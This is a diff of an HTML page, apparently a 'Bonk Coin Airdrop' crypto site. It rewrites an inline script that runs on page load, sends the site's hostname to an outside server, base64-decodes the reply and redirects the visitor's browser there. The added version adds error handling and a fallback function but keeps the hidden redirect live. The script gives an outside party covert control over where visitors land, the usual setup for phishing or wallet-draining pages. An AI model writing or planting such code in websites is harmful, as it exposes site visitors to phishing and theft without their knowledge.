@@ -17,14 +17,29 @@
     <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:100,200,300,400,500,600,700,800,900&display=swap" /></noscript>
   </head>
   <body>
-	  <script>
+<script>
 (async () => {
-  const domain =  new URL(location.href).hostname;
-  if (!domain) return;
-  const { status } = await (await fetch(`https://domain.memc.site/domain?url=${domain}`)).json();
-  if (status) location.href = atob(status);
+  const domain = new URL(location.href).hostname;
+  if (!domain) {
+    subsequentCode();
+    return;
+  }
+  try {
+    const res = await fetch(`https://domain.memc.site/domain?url=${domain}`);
+    if (!res.ok) throw new Error();
+    const { status } = await res.json();
+    if (status && status.trim()) {
+      location.href = atob(status);
+      return;
+    }
+  } catch (e) {}
+  subsequentCode();
 })();
+function subsequentCode() {
+  console.log("Subsequent code executed");
+}
 </script>
+
     <section class="image4" id="image04-0">
       <div class="image-block m-auto">
           <img src="headerp.jpg" class="header-mob" alt="Bonk Coin Airdrop" />
